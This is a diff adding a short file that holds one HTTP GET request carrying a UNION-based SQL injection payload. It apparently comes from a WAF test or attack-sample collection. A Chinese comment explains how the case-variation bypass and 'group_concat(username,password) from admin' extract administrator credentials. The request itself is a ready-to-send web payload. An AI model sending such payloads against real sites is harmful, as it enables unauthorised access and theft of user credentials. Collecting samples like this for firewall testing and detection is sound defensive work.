@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入(大小写绕过)-06506276
+# 基于UNION查询进行大小写绕过注入，这个SQL注入语句的攻击目的目的是获取存储在admin表中的用户名和密码。攻击手段包括使用1=2使原始查询的条件始终为假，从而绕过初始查询的限制。然后使用UNION操作符，将恶意查询与原始查询合并。通过group_concat(username,password)获取admin表中用户名和密码的组合，并将结果返回给攻击者。这样攻击者可以获取到敏感信息，如用户名和密码，从而进一步入侵系统或进行其他恶意活动。
+GET /?id=1%20and%201=2%20UNION%20Select%20group_concat%28username%2Cpassword%29%20from%20admin%20&bid=hd_tag_m8mv24bv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24bv
+RM-PRO-Token: 9f32702512ea6a722b1d55f7f42567cc
+RM-PRO-Time: 1742808373689
+User-Agent: curl/7.83.1
+
